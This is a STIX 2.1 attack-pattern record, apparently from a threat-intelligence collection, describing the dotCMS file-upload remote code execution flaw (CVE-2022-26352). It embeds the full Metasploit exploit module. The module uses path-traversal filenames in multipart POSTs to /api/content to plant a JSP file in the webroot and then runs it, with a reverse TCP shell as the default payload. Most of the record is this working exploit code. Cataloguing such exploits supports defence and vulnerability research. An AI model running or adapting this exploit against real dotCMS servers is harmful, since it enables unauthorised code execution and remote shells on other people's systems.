{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--4c5307d0-b7c3-4d70-8d0f-f8e90d378b82",
    "created": "2024-08-14T17:10:38.011793Z",
    "modified": "2024-08-14T17:10:38.011796Z",
    "name": "DotCMS RCE via Arbitrary File Upload.",
    "description": " When files are uploaded into dotCMS via the content API, but before they become content, dotCMS writes the file down in a temp directory.  In the case of this vulnerability, dotCMS does not sanitize the filename passed in via the multipart request header and thus does not sanitize the temp file's name.  This allows a specially crafted request to POST files to dotCMS via the ContentResource (POST /api/content)  that get written outside of the dotCMS temp directory.  In the case of this exploit, an attacker can upload a special .jsp file to the webapp/ROOT directory of dotCMS which can allow for remote code execution. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/dotcms_file_upload_rce.rb",
            "external_id": "dotcms_file_upload_rce.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2022-26352"
        },
        {
            "source_name": "reference",
            "url": "https://blog.assetnote.io/2022/05/03/hacking-a-bank-using-dotcms-rce/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::FileDropper\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'DotCMS RCE via Arbitrary File Upload.',\n        'Description' => %q{\n          When files are uploaded into dotCMS via the content API, but before they become content, dotCMS writes the\n          file down in a temp directory.  In the case of this vulnerability, dotCMS does not sanitize the filename\n          passed in via the multipart request header and thus does not sanitize the temp file's name.  This allows a\n          specially crafted request to POST files to dotCMS via the ContentResource (POST /api/content)  that get\n          written outside of the dotCMS temp directory.  In the case of this exploit, an attacker can upload a special\n          .jsp file to the webapp/ROOT directory of dotCMS which can allow for remote code execution.\n        },\n        'Author' => [\n          'Shubham Shah',  # Discovery and analysis\n          'Hussein Daher', # Discovery and analysis\n          'jheysel-r7'     # Metasploit module\n        ],\n        'License' => MSF_LICENSE,\n        'References' => [\n          ['CVE', '2022-26352'],\n          ['URL', 'https://blog.assetnote.io/2022/05/03/hacking-a-bank-using-dotcms-rce/']\n        ],\n        'Privileged' => false,\n        'Platform' => %w[linux win],\n        'Targets' => [\n          [\n            'Java Linux',\n            {\n              'Arch' => ARCH_JAVA,\n              'Platform' => 'linux'\n            }\n          ],\n          [\n            'Java Windows',\n            {\n              'Arch' => ARCH_JAVA,\n              'Platform' => 'win'\n            }\n          ]\n        ],\n        'DisclosureDate' => '2022-05-03',\n        'DefaultTarget' => 0,\n        'DefaultOptions' => {\n          'SSL' => true,\n          'PAYLOAD' => 'java/jsp_shell_reverse_tcp'\n        },\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [ARTIFACTS_ON_DISK, IOC_IN_LOGS]\n        }\n      )\n    )\n\n    register_options([\n      Opt::RPORT(8443),\n      OptString.new('TARGETURI', [true, 'Base path', '/'])\n    ])\n  end\n\n  def check\n    test_content = Rex::Text.rand_text_alpha(10)\n    test_file = \"#{test_content}.jsp\"\n    test_path = \"../../#{test_file}\"\n    uuid = Faker::Internet.uuid\n\n    jsp = <<~EOS\n      <%@ page import=\\\"java.io.File\\\" %>\n      <%\n        File jsp=new File(getServletContext().getRealPath(File.separator) + File.separator + \"#{test_file}\");\n        jsp.delete();\n      %>\n      #{uuid}\n    EOS\n\n    vars_form_data = [\n      {\n        'name' => 'name',\n        'data' => jsp,\n        'encoding' => nil,\n        'filename' => test_path,\n        'mime_type' => 'text/plain'\n      }\n    ]\n\n    send_request_cgi(\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, '/api/content/'),\n      'vars_form_data' => vars_form_data\n    )\n\n    res = send_request_cgi(\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, test_file.to_s)\n    )\n\n    if res && res.body.include?(uuid)\n      return Exploit::CheckCode::Vulnerable\n    end\n\n    Exploit::CheckCode::Safe\n  end\n\n  def write_jsp_payload\n    jsp_path = \"../../#{jsp_filename}\"\n    print_status('Writing JSP payload')\n    vars_form_data = [\n      {\n        'name' => 'name',\n        'data' => payload.encoded,\n        'encoding' => nil,\n        'filename' => jsp_path,\n        'mime_type' => 'text/plain'\n      }\n    ]\n\n    res = send_request_cgi(\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, '/api/content/'),\n      'vars_form_data' => vars_form_data\n    )\n\n    unless res&.code == 500\n      fail_with(Failure::NotVulnerable, 'Failed to write JSP payload')\n    end\n\n    register_file_for_cleanup(\"../webapps/ROOT/#{jsp_filename}\")\n    print_good('Successfully wrote JSP payload')\n  end\n\n  def execute_jsp_payload\n    jsp_uri = normalize_uri(target_uri.path, jsp_filename)\n    print_status('Executing JSP payload')\n    res = send_request_cgi(\n      'method' => 'GET',\n      'uri' => jsp_uri\n    )\n\n    unless res&.code == 200\n      fail_with(Failure::PayloadFailed, 'Failed to execute JSP payload')\n    end\n    print_good('Successfully executed JSP payload')\n  end\n\n  def exploit\n    write_jsp_payload\n    execute_jsp_payload\n  end\n\n  def jsp_filename\n    @jsp_filename ||= \"#{rand_text_alphanumeric(8..16)}.jsp\"\n  end\nend\n",
    "x_mitre_disclosure_date": "2022-05-03",
    "x_mitre_platforms": [
        "win"
    ]
}